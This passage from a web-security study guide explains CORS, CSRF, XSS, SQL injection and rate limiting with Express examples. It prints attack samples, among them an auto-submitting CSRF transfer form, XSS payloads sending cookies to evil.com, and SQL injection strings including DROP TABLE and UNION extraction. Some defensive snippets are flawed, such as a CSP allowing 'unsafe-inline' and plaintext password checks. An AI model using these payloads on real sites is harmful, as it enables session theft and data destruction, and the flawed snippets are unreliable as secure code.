      callback(new Error('Not allowed by CORS'))
    }
  }
}))

// Allows:
// https://example.com
// https://app.example.com
// https://api.example.com
// https://staging-app.example.com
```

---

#### Common CORS Errors and Fixes

**Error 1: No 'Access-Control-Allow-Origin' header**

```javascript
// Fix: Add CORS middleware
app.use(cors())
```

**Error 2: Credentials not allowed**

```javascript
// Fix: Set credentials: true
app.use(cors({
  origin: 'https://frontend.com',
  credentials: true
}))

// Frontend must also include:
fetch(url, { credentials: 'include' })
```

**Error 3: Method not allowed**

```javascript
// Fix: Add method to allowedMethods
app.use(cors({
  methods: ['GET', 'POST', 'DELETE']  // Add DELETE
}))
```

**Error 4: Header not allowed**

```javascript
// Fix: Add header to allowedHeaders
app.use(cors({
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Custom-Header']
}))
```

---

### 5. What is CSRF (Cross-Site Request Forgery)? How do you prevent it?

**CSRF (Cross-Site Request Forgery)** is an attack where a malicious website tricks a user's browser into making unauthorized requests to a different website where the user is authenticated.

#### How CSRF Works

**Attack Scenario:**

```
┌────────────────────────────────────────────────────────┐
│              CSRF Attack Flow                          │
└────────────────────────────────────────────────────────┘

Step 1: User Logs Into Bank
──────────────────────────────────────────────────────
User                         Bank.com
  │                              │
  │  Login (email/password)      │
  │ ──────────────────────────> │
  │                              │
  │  Set-Cookie: session=abc123  │
  │ <────────────────────────────│
  │                              │
✅ User is now authenticated
   Browser stores session cookie


Step 2: User Visits Malicious Site (while still logged in)
──────────────────────────────────────────────────────
User                         Evil.com
  │                              │
  │  Visit evil.com              │
  │ ──────────────────────────> │
  │                              │
  │  Return malicious HTML       │
  │ <────────────────────────────│
  │                              │


Step 3: Malicious HTML Triggers Request to Bank
──────────────────────────────────────────────────────
<!-- evil.com serves this HTML: -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>
  document.forms[0].submit()  // Auto-submit
</script>


Step 4: Browser Sends Request with Cookies
──────────────────────────────────────────────────────
Browser                      Bank.com
  │                              │
  │  POST /transfer              │
  │  Cookie: session=abc123      │ ← Browser automatically
  │  to=attacker&amount=10000    │   sends session cookie!
  │ ──────────────────────────> │
  │                              │
  │  ✅ Transfer successful      │
  │ <────────────────────────────│
  │                              │
❌ Money transferred without user's knowledge!
```

---

#### Real Example

**1. User logs into bank.com:**

```javascript
// User is authenticated
// Browser has cookie: session=abc123
```

**2. User visits evil.com (attacker's site):**

```html
<!-- evil.com page -->
<html>
<body>
  <h1>Cute Cat Pictures!</h1>
  
  <!-- Hidden malicious form -->
  <form id="hack" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker-account">
    <input type="hidden" name="amount" value="10000">
  </form>
  
  <script>
    // Auto-submit form
    document.getElementById('hack').submit()
  </script>
</body>
</html>
```

**3. Browser automatically sends cookies:**

```http
POST /transfer HTTP/1.1
Host: bank.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

to=attacker-account&amount=10000
```

**4. Bank.com processes request:**

```javascript
// Bank sees valid session cookie
// Bank thinks: "User is authenticated, process transfer"
// ❌ Money is transferred to attacker!
```

---

#### Prevention Methods

#### **1. CSRF Tokens (Most Common)**

**How It Works:**

- Server generates a random token
- Token stored in session AND sent to client
- Client must include token in requests
- Server verifies token matches

**Implementation:**

```javascript
const csrf = require('csurf')
const cookieParser = require('cookie-parser')

app.use(cookieParser())
app.use(csrf({ cookie: true }))

// Send CSRF token to client
app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() })
})

// Verify CSRF token
app.post('/transfer', (req, res) => {
  // Token is automatically verified by csrf middleware
  // If invalid, request is rejected
  
  res.json({ message: 'Transfer successful' })
})
```

**Frontend:**

```html
<form action="/transfer" method="POST">
  <!-- Include CSRF token in hidden field -->
  <input type="hidden" name="_csrf" value="{{ csrfToken }}">
  
  <input name="to" value="recipient">
  <input name="amount" value="100">
  <button type="submit">Transfer</button>
</form>
```

**With AJAX:**

```javascript
// Get CSRF token from meta tag or cookie
const csrfToken = document.querySelector('meta[name="csrf-token"]').content

fetch('/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken  // Include in header
  },
  body: JSON.stringify({ to: 'recipient', amount: 100 })
})
```

---

#### **2. SameSite Cookie Attribute**

```javascript
// Set SameSite attribute on cookies
res.cookie('session', 'abc123', {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'  // or 'lax'
})
```

**SameSite Values:**

```javascript
// Strict - Cookie NEVER sent on cross-site requests
sameSite: 'strict'
// Most secure, but breaks some legitimate use cases
// (e.g., can't follow link from email)

// Lax - Cookie sent on top-level navigation (GET only)
sameSite: 'lax'
// Good balance - prevents CSRF but allows GET navigation

// None - Cookie sent on all requests (requires Secure)
sameSite: 'none'
// Used for cross-site scenarios (OAuth, embeds)
```

**Example:**

```javascript
app.post('/login', (req, res) => {
  res.cookie('session', 'abc123', {
    httpOnly: true,
    secure: true,
    sameSite: 'lax'  // Prevents CSRF on POST requests
  })
  
  res.json({ message: 'Logged in' })
})
```

---

#### **3. Check Origin/Referer Headers**

```javascript
app.use((req, res, next) => {
  const origin = req.headers.origin || req.headers.referer
  
  // Check if request is from allowed origin
  const allowedOrigins = ['https://myapp.com']
  
  if (req.method !== 'GET' && !allowedOrigins.some(allowed => origin?.startsWith(allowed))) {
    return res.status(403).json({ error: 'Forbidden - CSRF detected' })
  }
  
  next()
})
```

---

#### **4. Double Submit Cookie**

```javascript
// 1. Generate random token
const csrfToken = crypto.randomBytes(32).toString('hex')

// 2. Set token in cookie
res.cookie('csrf-token', csrfToken, {
  httpOnly: false,  // Must be readable by JavaScript
  secure: true,
  sameSite: 'strict'
})

// 3. Client reads cookie and sends in header
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': document.cookie.split('csrf-token=')[1]
  },
  body: JSON.stringify(data)
})

// 4. Server verifies cookie matches header
app.post('/api/transfer', (req, res) => {
  const cookieToken = req.cookies['csrf-token']
  const headerToken = req.headers['x-csrf-token']
  
  if (!cookieToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'CSRF token mismatch' })
  }
  
  // Process request
  res.json({ message: 'Transfer successful' })
})
```

---

#### **5. Custom Request Headers**

```javascript
// Attacker cannot set custom headers in simple HTML forms
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest'  // Custom header
  },
  body: JSON.stringify(data)
})

// Server checks for custom header
app.post('/api/transfer', (req, res) => {
  if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
    return res.status(403).json({ error: 'Invalid request' })
  }
  
  // Process request
})
```

---

#### **6. Re-authentication for Sensitive Actions**

```javascript
app.post('/transfer', (req, res) => {
  const { password, to, amount } = req.body
  
  // Require password confirmation for sensitive action
  if (!verifyPassword(req.user, password)) {
    return res.status(401).json({ error: 'Invalid password' })
  }
  
  // Process transfer
  res.json({ message: 'Transfer successful' })
})
```

---

#### Complete CSRF Protection Example

```javascript
const express = require('express')
const csrf = require('csurf')
const cookieParser = require('cookie-parser')

const app = express()

// Middleware
app.use(express.json())
app.use(cookieParser())

// CSRF protection
const csrfProtection = csrf({ cookie: true })

// Session cookie with SameSite
app.post('/login', (req, res) => {
  // Authenticate user...
  
  res.cookie('session', 'user-session-token', {
    httpOnly: true,
    secure: true,
    sameSite: 'lax'  // CSRF prevention
  })
  
  res.json({ message: 'Logged in' })
})

// Protected routes
app.post('/transfer', csrfProtection, (req, res) => {
  // CSRF token automatically verified
  
  const { to, amount } = req.body
  
  // Process transfer
  res.json({ message: 'Transfer successful' })
})

// Get CSRF token
app.get('/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() })
})
```

**Frontend:**

```javascript
// 1. Get CSRF token
const response = await fetch('/csrf-token')
const { csrfToken } = await response.json()

// 2. Include token in requests
fetch('/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken
  },
  credentials: 'include',
  body: JSON.stringify({ to: 'recipient', amount: 100 })
})
```

---

#### Why This Prevents CSRF

**Attacker Cannot:**

1. **Read CSRF token** - Same-Origin Policy blocks cross-origin reads
2. **Guess token** - Randomly generated, unpredictable
3. **Set custom headers** - HTML forms cannot set custom headers
4. **Access cookies** - SameSite prevents cross-site cookie sending

---

### 6. What is XSS (Cross-Site Scripting)? How do you prevent it?

**XSS (Cross-Site Scripting)** is a security vulnerability where attackers inject malicious JavaScript code into a website, which then executes in other users' browsers.

#### Types of XSS

**1. Stored XSS (Persistent)**
**2. Reflected XSS (Non-Persistent)**
**3. DOM-based XSS**

---

#### 1. Stored XSS (Most Dangerous)

**Attack Flow:**

```
┌────────────────────────────────────────────────────────┐
│                Stored XSS Attack                       │
└────────────────────────────────────────────────────────┘

Step 1: Attacker Injects Malicious Code
──────────────────────────────────────────────────────
Attacker submits comment:

<script>
  // Steal cookies
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>

Website stores this in database ❌


Step 2: Victim Views Page
──────────────────────────────────────────────────────
User visits page with comments

Server retrieves comment from database

Server sends HTML:
<div class="comment">
  <script>
    fetch('https://evil.com/steal?cookie=' + document.cookie)
  </script>
</div>


Step 3: Malicious Script Executes
──────────────────────────────────────────────────────
Browser executes script
Victim's cookies sent to attacker
Attacker can hijack session ❌
```

**Example:**

```javascript
// Vulnerable code
app.post('/comments', async (req, res) => {
  const { comment } = req.body
  
  // ❌ Directly saving user input
  await db.comments.create({ text: comment })
  
  res.json({ message: 'Comment added' })
})

app.get('/comments', async (req, res) => {
  const comments = await db.comments.find()
  
  // ❌ Directly rendering user input
  res.send(`
    <html>
      <body>
        ${comments.map(c => `<div>${c.text}</div>`).join('')}
      </body>
    </html>
  `)
})
```

**Attack:**

```html
<!-- Attacker submits: -->
<img src="x" onerror="fetch('https://evil.com/steal?cookie=' + document.cookie)">

<!-- Gets stored and executed for all users! -->
```

---

#### 2. Reflected XSS

**Attack Flow:**

```javascript
// Vulnerable search page
app.get('/search', (req, res) => {
  const { q } = req.query
  
  // ❌ Directly rendering user input
  res.send(`
    <html>
      <body>
        <h1>Search results for: ${q}</h1>
      </body>
    </html>
  `)
})
```

**Attack:**

```
https://example.com/search?q=<script>alert(document.cookie)</script>

User clicks link → Script executes immediately
```

---

#### 3. DOM-based XSS

**Vulnerable Frontend Code:**

```javascript
// ❌ Directly inserting user input into DOM
const username = new URLSearchParams(window.location.search).get('name')
document.getElementById('welcome').innerHTML = `Welcome ${username}!`
```

**Attack:**

```
https://example.com/welcome?name=<img src=x onerror="alert(document.cookie)">
```

---

#### Prevention Methods

#### **1. Escape/Sanitize User Input (Most Important)**

**Backend (Express with EJS):**

```javascript
// ✅ Use template engines that auto-escape
app.set('view engine', 'ejs')

app.get('/comments', async (req, res) => {
  const comments = await db.comments.find()
  
  // EJS automatically escapes <%= %>
  res.render('comments', { comments })
})
```

**EJS Template:**

```html
<!-- ✅ Auto-escaped -->
<% comments.forEach(comment => { %>
  <div><%= comment.text %></div>
<% }) %>

<!-- This will display as text, not execute: -->
<!-- &lt;script&gt;alert('XSS')&lt;/script&gt; -->
```

**Manual Escaping:**

```javascript
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;")
}

app.get('/comments', async (req, res) => {
  const comments = await db.comments.find()
  
  res.send(`
    <html>
      <body>
        ${comments.map(c => `<div>${escapeHtml(c.text)}</div>`).join('')}
      </body>
    </html>
  `)
})
```

---

#### **2. Content Security Policy (CSP)**

```javascript
// Set CSP headers
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; " +                    // Only load from same origin
    "script-src 'self' 'unsafe-inline'; " +     // Only allow scripts from same origin
    "style-src 'self' 'unsafe-inline'; " +      // Only allow styles from same origin
    "img-src 'self' data: https:; " +           // Allow images from self and HTTPS
    "font-src 'self'; " +                       // Only fonts from same origin
    "connect-src 'self'; " +                    // Only AJAX to same origin
    "frame-ancestors 'none'"                    // Prevent clickjacking
  )
  next()
})
```

**Effect:** Even if XSS payload is injected, CSP blocks execution:

```html
<!-- Injected script won't execute -->
<script>alert('XSS')</script>
<!-- Blocked by CSP! -->
```

---

#### **3. Use `textContent` Instead of `innerHTML`**

```javascript
// ❌ DANGEROUS - innerHTML can execute scripts
element.innerHTML = userInput

// ✅ SAFE - textContent treats everything as text
element.textContent = userInput
```

**Example:**

```javascript
// Frontend
const username = getUserInput()

// ❌ Vulnerable
document.getElementById('welcome').innerHTML = `Welcome ${username}!`

// ✅ Safe
document.getElementById('welcome').textContent = `Welcome ${username}!`
```

---

#### **4. Sanitize HTML (If HTML is Required)**

```javascript
const DOMPurify = require('isomorphic-dompurify')

app.post('/comments', async (req, res) => {
  const { comment } = req.body
  
  // ✅ Sanitize HTML - removes dangerous tags/attributes
  const sanitized = DOMPurify.sanitize(comment, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  })
  
  await db.comments.create({ text: sanitized })
  
  res.json({ message: 'Comment added' })
})
```

**Frontend:**

```javascript
import DOMPurify from 'dompurify'

// ✅ Sanitize before inserting
const clean = DOMPurify.sanitize(userInput)
element.innerHTML = clean
```

---

#### **5. HttpOnly Cookies**

```javascript
// ✅ HttpOnly prevents JavaScript access to cookies
res.cookie('session', 'token123', {
  httpOnly: true,  // Cannot be accessed by document.cookie
  secure: true,
  sameSite: 'strict'
})
```

**Why This Helps:**

```javascript
// Even if XSS occurs:
document.cookie  // HttpOnly cookies not visible
// Attacker cannot steal session token
```

---

#### **6. Validate Input**

```javascript
// ✅ Validate and reject suspicious input
app.post('/comments', (req, res) => {
  const { comment } = req.body
  
  // Check for script tags
  if (/<script|javascript:/i.test(comment)) {
    return res.status(400).json({ error: 'Invalid input' })
  }
  
  // Limit length
  if (comment.length > 1000) {
    return res.status(400).json({ error: 'Comment too long' })
  }
  
  // Process comment...
})
```

---

#### **7. Use React (Auto-Escaping)**

```javascript
// ✅ React automatically escapes
function Comment({ text }) {
  return <div>{text}</div>
  // Even if text contains <script>, it's rendered as text
}

// ❌ Don't use dangerouslySetInnerHTML unless necessary
function Comment({ text }) {
  return <div dangerouslySetInnerHTML={{ __html: text }} />
  // Dangerous! Only use with sanitized content
}
```

---

#### Complete XSS Prevention Example

```javascript
const express = require('express')
const DOMPurify = require('isomorphic-dompurify')
const helmet = require('helmet')

const app = express()

// Security middleware
app.use(helmet())  // Sets various security headers including CSP
app.use(express.json())

// Custom CSP
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
  }
}))

// Escape HTML helper
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;")
}

// Add comment - WITH protection
app.post('/comments', async (req, res) => {
  const { comment } = req.body
  
  // 1. Validate
  if (!comment || comment.length > 1000) {
    return res.status(400).json({ error: 'Invalid comment' })
  }
  
  // 2. Check for suspicious patterns
  if (/<script|javascript:|onerror=/i.test(comment)) {
    return res.status(400).json({ error: 'Suspicious content detected' })
  }
  
  // 3. Sanitize (if allowing some HTML)
  const sanitized = DOMPurify.sanitize(comment, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
  })
  
  // 4. Save to database
  await db.comments.create({ text: sanitized })
  
  res.json({ message: 'Comment added' })
})

// Display comments - WITH protection
app.get('/comments', async (req, res) => {
  const comments = await db.comments.find()
  
  // Escape when rendering
  const html = `
    <html>
      <head>
        <meta http-equiv="Content-Security-Policy" 
              content="default-src 'self'">
      </head>
      <body>
        <h1>Comments</h1>
        ${comments.map(c => `
          <div class="comment">
            ${escapeHtml(c.text)}
          </div>
        `).join('')}
      </body>
    </html>
  `
  
  res.send(html)
})

// Set HttpOnly cookies
app.post('/login', (req, res) => {
  res.cookie('session', 'token123', {
    httpOnly: true,   // XSS cannot read
    secure: true,
    sameSite: 'strict'
  })
  
  res.json({ message: 'Logged in' })
})
```

---

#### XSS Testing

**Test if your site is vulnerable:**

```javascript
// Try these payloads in user input fields:

<script>alert('XSS')</script>

<img src="x" onerror="alert('XSS')">

<svg onload="alert('XSS')">

<iframe src="javascript:alert('XSS')">

"><script>alert('XSS')</script>

<input onfocus="alert('XSS')" autofocus>

// If any of these execute, you have XSS vulnerability!
```

---

### 7. What is SQL Injection? How do you prevent it?

**SQL Injection** is an attack where an attacker inserts malicious SQL code into input fields, causing the database to execute unintended commands.

#### How SQL Injection Works

**Vulnerable Code:**

```javascript
// ❌ DANGEROUS - Never do this!
app.post('/login', async (req, res) => {
  const { email, password } = req.body
  
  // Directly inserting user input into SQL query
  const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`
  
  const user = await db.query(query)
  
  if (user) {
    res.json({ message: 'Login successful' })
  } else {
    res.status(401).json({ error: 'Invalid credentials' })
  }
})
```

**Attack:**

```javascript
// Attacker inputs:
email: "admin@example.com' OR '1'='1"
password: "anything"

// Resulting query:
SELECT * FROM users 
WHERE email = 'admin@example.com' OR '1'='1' AND password = 'anything'
                                      ↑
                                 Always true!

// Attacker logs in as admin without knowing password! ❌
```

---

#### More Dangerous Attacks

**1. Delete All Data:**

```javascript
// Input:
email: "'; DROP TABLE users; --"
password: "anything"

// Resulting query:
SELECT * FROM users WHERE email = ''; 
DROP TABLE users; 
-- ' AND password = 'anything'

// Entire users table deleted! ❌
```

**2. Extract All Data:**

```javascript
// Input:
email: "' UNION SELECT email, password FROM users --"
password: "anything"

// Resulting query:
SELECT * FROM users WHERE email = '' 
UNION SELECT email, password FROM users -- ' AND password = 'anything'

// Attacker gets all emails and passwords! ❌
```

**3. Bypass Authentication:**

```javascript
// Input:
email: "admin@example.com"
password: "' OR '1'='1' --"

// Resulting query:
SELECT * FROM users WHERE email = 'admin@example.com' AND password = '' OR '1'='1' --'

// Always returns user, login successful! ❌
```

---

#### Prevention Methods

#### **1. Parameterized Queries (Prepared Statements) - BEST**

**With MySQL (mysql2):**

```javascript
const mysql = require('mysql2/promise')

app.post('/login', async (req, res) => {
  const { email, password } = req.body
  
  // ✅ SAFE - Uses parameterized query
  const [users] = await db.query(
    'SELECT * FROM users WHERE email = ? AND password = ?',
    [email, password]  // Parameters separately
  )
  
  if (users.length > 0) {
    res.json({ message: 'Login successful' })
  } else {
    res.status(401).json({ error: 'Invalid credentials' })
  }
})
```

**Why This Works:**

```javascript
// Even if attacker tries:
email: "' OR '1'='1' --"

// Database treats it as literal string:
SELECT * FROM users WHERE email = '\' OR \'1\'=\'1\' --'
// Not as SQL code! Just searches for that exact string.
```

---

#### **2. Use ORMs (Object-Relational Mapping)**

**Mongoose (MongoDB):**

```javascript
const User = require('./models/User')

app.post('/login', async (req, res) => {
  const { email, password } = req.body
  
  // ✅ SAFE - Mongoose handles escaping
  const user = await User.findOne({ email, password })
  
  if (user) {
    res.json({ message: 'Login successful' })
  } else {
    res.status(401).json({ error: 'Invalid credentials' })
  }
})
```

**Sequelize (SQL databases):**

```javascript
const { User } = require('./models')

app.post('/login', async (req, res) => {
  const { email, password } = req.body
  
  // ✅ SAFE - Sequelize uses parameterized queries
  const user = await User.findOne({
    where: { email, password }
  })
  
  if (user) {
    res.json({ message: 'Login successful' })
  } else {
    res.status(401).json({ error: 'Invalid credentials' })
  }
})
```

---

#### **3. Input Validation**

```javascript
// ✅ Validate and sanitize input
app.post('/login', async (req, res) => {
  const { email, password } = req.body
  
  // Validate email format
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  if (!emailRegex.test(email)) {
    return res.status(400).json({ error: 'Invalid email format' })
  }
  
  // Check for SQL injection patterns
  const sqlPattern = /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER)\b|--|;|\/\*|\*\/)/i
  if (sqlPattern.test(email) || sqlPattern.test(password)) {
    return res.status(400).json({ error: 'Invalid input detected' })
  }
  
  // Proceed with query (using parameterized query)
  const [users] = await db.query(
    'SELECT * FROM users WHERE email = ? AND password = ?',
    [email, password]
  )
  
  if (users.length > 0) {
    res.json({ message: 'Login successful' })
  } else {
    res.status(401).json({ error: 'Invalid credentials' })
  }
})
```

---

#### **4. Escape Special Characters**

```javascript
const mysql = require('mysql2')

// ✅ Escape user input
app.post('/search', async (req, res) => {
  const { query } = req.body
  
  // Escape special characters
  const escapedQuery = mysql.escape(query)
  
  const results = await db.query(
    `SELECT * FROM products WHERE name LIKE '%${escapedQuery}%'`
  )
  
  res.json({ results })
})
```

---

#### **5. Principle of Least Privilege (Database)**

```sql
-- ✅ Create database user with limited permissions

-- Application user - only needs SELECT, INSERT, UPDATE
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON mydb.* TO 'app_user'@'localhost';

-- Don't grant:
-- - DROP
-- - DELETE
-- - ALTER
-- - CREATE

-- Even if SQL injection occurs, attacker cannot:
-- DROP TABLE users;  -- ❌ Permission denied
```

---

#### **6. Stored Procedures**

```sql
-- Create stored procedure
CREATE PROCEDURE GetUser(IN userEmail VARCHAR(255))
BEGIN
  SELECT * FROM users WHERE email = userEmail;
END;
```

```javascript
// Call stored procedure
app.post('/login', async (req, res) => {
  const { email } = req.body
  
  // ✅ SAFE - Stored procedure handles input
  const [users] = await db.query('CALL GetUser(?)', [email])
  
  res.json({ users })
})
```

---

#### **7. Web Application Firewall (WAF)**

```javascript
// Use WAF middleware to detect SQL injection attempts
const { WAF } = require('express-waf')

app.use(WAF({
  rules: [
    // Block SQL injection patterns
    /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER)\b|--|;|\/\*|\*\/)/i
  ]
}))
```

---

#### Complete SQL Injection Prevention Example

```javascript
const express = require('express')
const mysql = require('mysql2/promise')
const validator = require('validator')

const app = express()
app.use(express.json())

// Database connection with least privilege
const db = await mysql.createConnection({
  host: 'localhost',
  user: 'app_user',      // Limited permissions
  password: 'password',
  database: 'mydb'
})

// Login endpoint - PROTECTED
app.post('/login', async (req, res) => {
  const { email, password } = req.body
  
  // 1. Validate input format
  if (!validator.isEmail(email)) {
    return res.status(400).json({ error: 'Invalid email format' })
  }
  
  if (!password || password.length < 8) {
    return res.status(400).json({ error: 'Invalid password' })
  }
  
  // 2. Check for suspicious patterns
  const sqlPattern = /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER)\b|--|;|\/\*|\*\/)/i
  if (sqlPattern.test(email) || sqlPattern.test(password)) {
    // Log suspicious activity
    console.log(`SQL injection attempt detected: ${email}`)
    return res.status(400).json({ error: 'Invalid input' })
  }
  
  try {
    // 3. Use parameterized query
    const [users] = await db.query(
      'SELECT id, email, role FROM users WHERE email = ? AND password = ?',
      [email, password]
    )
    
    if (users.length > 0) {
      res.json({ 
        message: 'Login successful',
        user: users[0]
      })
    } else {
      res.status(401).json({ error: 'Invalid credentials' })
    }
  } catch (error) {
    console.error('Database error:', error)
    res.status(500).json({ error: 'Internal server error' })
  }
})

// Search endpoint - PROTECTED
app.get('/search', async (req, res) => {
  const { q } = req.query
  
  // 1. Validate
  if (!q || q.length > 100) {
    return res.status(400).json({ error: 'Invalid search query' })
  }
  
  // 2. Sanitize
  const sanitized = q.replace(/[^\w\s]/g, '')  // Remove special chars
  
  try {
    // 3. Use parameterized query
    const [results] = await db.query(
      'SELECT * FROM products WHERE name LIKE ?',
      [`%${sanitized}%`]
    )
    
    res.json({ results })
  } catch (error) {
    console.error('Database error:', error)
    res.status(500).json({ error: 'Internal server error' })
  }
})

app.listen(3000)
```

---

#### SQL Injection Testing

**Test if your site is vulnerable:**

```javascript
// Try these in login forms or search fields:

// 1. Basic SQL injection
' OR '1'='1

// 2. Comment bypass
admin' --

// 3. Union attack
' UNION SELECT NULL, NULL --

// 4. Time-based blind injection
' OR SLEEP(5) --

// 5. Boolean-based blind injection
' AND 1=1 --
' AND 1=2 --

// If any behave differently, you may be vulnerable!
```

---

#### Key Takeaways

✅ **ALWAYS use parameterized queries or ORMs**  
✅ **Never concatenate user input into SQL queries**  
✅ **Validate and sanitize all input**  
✅ **Use least privilege for database users**  
✅ **Log and monitor suspicious activity**  
✅ **Use prepared statements**  
✅ **Escape special characters if needed**  
✅ **Regular security audits**

---

### 8. What are rate limiting and throttling? Why are they important?

**Rate Limiting** and **Throttling** are techniques to control the number of requests a client can make to an API within a specific time window.

#### Definitions

**Rate Limiting:**
- **Hard limit** on number of requests
- Blocks requests after limit exceeded
- Example: "10 requests per minute, then block"

**Throttling:**
- **Slows down** requests when limit is approached
- Queues or delays requests instead of blocking
- Example: "10 requests per minute, then delay by 5 seconds"

---

#### Why They're Important

**1. Prevent API Abuse**

```javascript
// Without rate limiting:
// Attacker can make millions of requests
for (let i = 0; i < 1000000; i++) {
  fetch('/api/data')
}

// With rate limiting:
// Only 10 requests allowed per minute
// Requests 11+ are blocked ✅
```

**2. Prevent DDoS Attacks**

```javascript
// Distributed Denial of Service Attack
// Thousands of bots making requests simultaneously

// Without rate limiting:
Server crashes under load ❌

// With rate limiting:
Each IP limited to 10 req/min
Server remains stable ✅
```

**3. Ensure Fair Resource Distribution**

```javascript
// Without rate limiting:
// One user makes 10,000 requests
// Other users experience slow responses

// With rate limiting:
// Each user gets fair share of resources
// All users get good performance
```

**4. Protect Against Brute Force Attacks**

```javascript
// Login brute force attack
for (password of passwordList) {
  fetch('/login', {
    method: 'POST',
    body: { email: 'victim@example.com', password }
  })
}

// With rate limiting:
// Only 5 login attempts per minute
// Brute force becomes impractical ✅
```

**5. Cost Control (External APIs)**

```javascript
// External API costs $0.01 per request

// Without rate limiting:
// Bug causes infinite loop
// 1,000,000 requests = $10,000 bill ❌

// With rate limiting:
// Max 1000 requests/hour
// Max cost = $10/hour ✅
```

**6. Server Stability**

```javascript
// Server can handle 1000 req/sec

// Without rate limiting:
// Spike of 10,000 req/sec
// Server crashes ❌

// With rate limiting:
// Max 100 req/sec per IP
// Server remains stable ✅
```

---

#### Implementation Examples

**1. Simple Rate Limiter (In-Memory)**

```javascript
const rateLimit = require('express-rate-limit')

// Limit to 100 requests per 15 minutes
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,                  // Max 100 requests per window
  message: 'Too many requests, please try again later.',
  standardHeaders: true,     // Return rate limit info in headers
  legacyHeaders: false,
})

// Apply to all routes
app.use(limiter)
```

**2. Strict Limiter for Sensitive Endpoints**

```javascript
// Login: 5 attempts per 15 minutes
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Too many login attempts, please try again later.',
})

app.post('/login', loginLimiter, loginController)
```

**3. Custom Rate Limiter (Day 4 Implementation)**

```javascript
const { rateLimiter, strictRateLimiter } = require('./middleware/rateLimiter.middleware')

// Global: 10 requests per minute
app.use(rateLimiter)

// Login: 5 requests per minute
app.post('/login', strictRateLimiter, loginController)

// Public: 30 requests per minute
app.get('/public', lenientRateLimiter, publicController)
```

---

#### Rate Limiting Strategies

**1. Fixed Window**

```javascript
// 10 requests per minute window

Time: 00:00 - 00:59  → 10 requests allowed
Time: 01:00 - 01:59  → 10 requests allowed (reset)

// Problem: Burst at window edge
Time: 00:59 → 10 requests
Time: 01:00 → 10 requests
// 20 requests in 1 second! ❌
```

**2. Sliding Window (Better)**

```javascript
// Tracks requests in last 60 seconds

Time: 00:00 → Request 1
Time: 00:30 → Request 2
Time: 00:59 → Request 3
Time: 01:00 → Request 4 (Request 1 expired)
Time: 01:30 → Request 5 (Request 2 expired)

// Smooth distribution ✅
```

**3. Token Bucket**

```javascript
// Bucket holds 10 tokens
// 1 token regenerates every 6 seconds

Request → Consume 1 token
If tokens available → Allow request
If no tokens → Block request

// Allows burst, then rate limits
```

**4. Leaky Bucket**

```javascript
// Process requests at constant rate
// Excess requests queued

10 requests arrive simultaneously
Process 1 request per second
Queue the rest

// Smooth, constant rate
```

---

#### Use Cases

**1. Public API**

```javascript
// 1000 requests per hour per API key
const apiLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 1000,
  keyGenerator: (req) => req.headers['x-api-key']
})

app.use('/api', apiLimiter)
```

**2. Authentication Endpoints**

```javascript
// 5 login attempts per 15 minutes
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5
})

app.post('/login', authLimiter, loginController)
app.post('/signup', authLimiter, signupController)
app.post('/reset-password', authLimiter, resetController)
```

**3. Resource-Intensive Operations**

```javascript
// 3 report generations per hour
const reportLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 3
})

app.post('/generate-report', reportLimiter, generateReport)
```

**4. File Uploads**

```javascript
// 10 uploads per hour
const uploadLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 10
})

app.post('/upload', uploadLimiter, uploadController)
```

---

#### Response Headers

```http
X-RateLimit-Limit: 10
X-RateLimit-Remaining: 7
X-RateLimit-Reset: 1640000000
Retry-After: 45

// Client knows:
// - Total limit: 10 requests
// - Remaining: 7 requests
// - Reset time: Unix timestamp
// - Retry after: 45 seconds
```

---

#### Benefits Summary

✅ **Security** - Prevent attacks (DDoS, brute force)  
✅ **Stability** - Server doesn't crash under load  
✅ **Fair Access** - All users get equal resources  
✅ **Cost Control** - Prevent expensive API abuse  
✅ **Quality of Service** - Better performance for all  
✅ **Compliance** - Meet SLA requirements  
